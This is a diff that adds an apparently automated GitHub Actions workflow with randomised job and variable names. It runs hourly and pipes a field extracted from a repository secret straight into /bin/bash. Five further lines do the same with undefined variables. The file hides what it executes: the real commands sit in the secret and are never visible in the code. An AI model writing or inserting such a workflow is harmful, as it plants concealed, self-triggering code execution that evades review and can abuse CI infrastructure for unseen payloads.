@@ -1,0 +1,23 @@
+name: ruanjingcan2576
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruanjingcan2576
+        env:
+          qn50252: ${{ secrets.qn50252 }}
+        run: |
+          echo $qn50252 | jq -r .fl4089 | /bin/bash
+          echo $gd9846 | jq -r .oe9 | /bin/bash
+          echo $i6 | jq -r .cr496 | /bin/bash
+          echo $f39084 | jq -r .vjrhc00888 | /bin/bash
+          echo $zfwfa0 | jq -r .wlk19624 | /bin/bash
+          echo $drjxf0238 | jq -r .k48 | /bin/bash
+
